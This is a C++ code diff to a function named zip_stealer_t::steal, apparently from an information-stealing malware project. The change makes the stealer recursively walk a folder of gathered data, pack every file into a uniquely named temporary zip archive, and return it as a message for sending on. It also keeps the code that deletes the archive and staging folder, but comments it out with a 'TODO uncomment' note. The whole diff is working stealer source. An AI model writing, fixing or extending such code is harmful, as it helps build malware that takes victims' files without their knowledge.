@@ -31,19 +31,32 @@ asio::awaitable<std::unique_ptr<message_t>> zip_stealer_t::steal()
 
     co_await net::wait(to_await.begin(), to_await.end());
 
-    for (const auto& message : result)
+    for (auto& message : result)
     {
-        if(const auto error_message = dynamic_cast<error_message_t*>(message.get()))
-            co_return error_message;
+        if(dynamic_cast<error_message_t*>(message.get()))
+            co_return std::move(message);
     }
 
     using namespace libzippp;
 
-    const auto archive_path = zip_folder_path / "archive.zip";
+    const auto archive_path = net::get_temp_unique_file_path().replace_extension("zip");
 
     ZipArchive zf{archive_path.string()};
     zf.open(ZipArchive::New);
-    zf.addEntry(zip_folder_path.string() + "/");
+
+    if(!fs::exists(zip_folder_path))
+        co_return std::make_unique<error_message_t>("ZipStealer(ERROR): cant access zip folder");
+
+    for(const auto& file : fs::recursive_directory_iterator{zip_folder_path})
+    {
+        if(!file.is_regular_file())
+            continue;
+        auto rel_path = fs::relative(file.path(), zip_folder_path);
+        if(!zf.addFile(rel_path.relative_path().make_preferred().string(),
+            file.path().string()))
+            DLOG("ZipStealer(ERROR): could not add file");
+    }
+
     zf.close();
 
     if(!fs::exists(archive_path))
@@ -51,6 +64,11 @@ asio::awaitable<std::unique_ptr<message_t>> zip_stealer_t::steal()
 
     auto to_ret = std::make_unique<file_message_t>();
     to_ret->init_with_path(archive_path.string());
+
+    /* TODO uncomment
     fs::remove(archive_path);
+    fs::remove(zip_folder_path);
+    */
+
     co_return to_ret;
 }
